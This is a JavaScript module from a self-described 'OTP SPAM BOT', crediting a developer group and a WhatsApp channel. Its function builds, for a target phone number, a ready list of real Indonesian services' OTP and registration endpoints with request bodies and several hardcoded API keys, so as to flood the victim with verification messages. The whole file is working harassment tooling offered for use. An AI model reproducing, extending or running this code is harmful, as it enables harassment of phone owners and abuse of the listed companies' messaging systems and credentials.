/*

BOTNAME: OTP SPAM BOT

Developer: Xvlovers
Tools for make this bot: Deepseek

©dont delete this credit!!
thanks to :
- xvlovers (developer)
- deepseek (helper for fix error code)
- all member xvlovers WhatsApp chanel

whatsapp channel: https://whatsapp.com/channel/0029VbCKJpb6LwHpbtC1mb3E




*/
/**
 * Endpoint list generator - menghasilkan array endpoint OTP
 */
const { randomEmail, rand } = require('./helpers');

/**
 * Generate semua endpoint OTP untuk nomor target
 * @param {string} phone - Nomor telepon format 62xxx
 * @returns {Array<Object>} - Array endpoint
 */
function getEndpoints(phone) {
  const p08 = '0' + phone.substring(2);
  const p62 = phone;
  const pNoCountry = phone.replace('62', '');
  const deviceId = String(rand(1000000000000000, 9999999999999999));
  const requestId = String(rand(1000000000000000, 9999999999999999));
  const email = randomEmail();

  return [
    {
      name: 'Maulagi',
      url: 'https://api.maulagi.id/api/v2/auth/check',
      json: { credentials: p62 },
      headers: { 'X-ML-KEY': 'B10JLPEP10' }
    },
    {
      name: 'Matahari',
      url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation',
      json: { mobileCountryCode: '', mobileNumber: p08, activationCode: '' }
    },
    {
      name: 'Pinhome',
      url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
      json: {
        accountType: 'customers',
        applicationType: 'Pinhome Web',
        countryCode: '62',
        medium: 'whatsapp',
        otpType: 'register',
        phoneNumber: pNoCountry
      }
    },
    {
      name: 'Bonus Belanja',
      url: 'https://www.bonusbelanja.com/api/auth/registration/app',
      json: {
        phone: p62,
        name: 'User',
        agreeTnc: true,
        agreeContact: false
      }
    },
    {
      name: 'Alodokter',
      url: 'https://www.alodokter.com/resend-otp',
      json: {
        user: {
          phone: p08,
          uuid: String(rand(10000000, 99999999))
        },
        request_via: 'whatsapp'
      }
    },
    {
      name: 'Beautyhaul',
      url: 'https://www.beautyhaul.com/ajax/account/send_otp',
      json: {
        method: 'WhatsApp',
        phone: p62
      }
    },
    {
      name: 'Gritero',
      url: 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id',
      json: {
        nama_lengkap: 'User',
        telepon: p08,
        email: `user${rand(1000, 9999)}@mail.com`
      },
      headers: {
        Xid: String(rand(1000000, 9999999)),
        source: 'ocistok'
      }
    },
    {
      name: 'Internet Rakyat',
      url: 'https://internetrakyat.id/api/app/auth/send-otp-register',
      json: {
        phone_number: p08
      },
      headers: {
        'x-api-key': '280999!FTTH'
      }
    },
    {
      name: 'Dokterin',
      url: 'https://api.dokterin.id/user/v1/users/login',
      json: {
        phone: p62,
        tnc_accept: true,
        device_id: deviceId
      }
    },
    {
      name: 'Paper.id',
      url: 'https://api.paper.id/api/v1/auth/login',
      json: {
        method: 'whatsapp',
        phone: p08
      },
      headers: {
        'x-paper-user-agent': 'Jupiter/7.19.5 desktop (windows) Firefox 152',
        'request-id': requestId
      }
    },
    {
      name: 'Bunda',
      url: 'https://cms.bunda.co.id/api/v1/auth/send-otp',
      json: {
        phone_number: p62,
        type: 'auth'
      }
    },
    {
      name: 'Fastwork',
      url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode',
      json: {
        phone_number: p08
      }
    },
    {
      name: 'Saturdays',
      url: 'https://api.saturdays.com/v2/user/otp/request',
      json: {
        phoneNumber: p62,
        channel: 'whatsapp'
      }
    },
    {
      name: 'Indodax',
      url: 'https://api.indodax.com/api/v1/otp/send',
      json: {
        email: email,
        flow: 'register',
        method: 'whatsapp',
        old_uuid: ''
      },
      headers: {
        key: 'bAGUG2WiLy',
        authorization: 'Bearer bAGUG2WiLy'
      }
    }
  ];
}

module.exports = { getEndpoints };